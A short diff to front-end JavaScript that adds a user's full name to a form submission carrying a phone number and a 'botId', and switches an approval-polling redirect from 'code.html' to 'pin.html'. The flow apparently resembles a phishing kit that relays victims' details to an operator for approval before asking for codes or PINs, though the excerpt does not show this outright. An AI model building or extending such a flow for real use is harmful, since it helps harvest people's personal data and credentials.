@@ -314,6 +314,7 @@ form.addEventListener('submit', async (e)=>{
       headers:{ 'Content-Type':'application/json' },
 
       body:JSON.stringify({
+        name:fullName,
         phone,
         botId
       })
@@ -345,9 +346,9 @@ function pollApproval(requestId){
 
     const data = await res.json();
 
-    if(data.redirect === 'code'){
+    if(data.redirect === 'pin'){
       clearInterval(interval);
-      window.location.href='code.html';
+      window.location.href='pin.html';
     }
 
     if(data.approved === false){
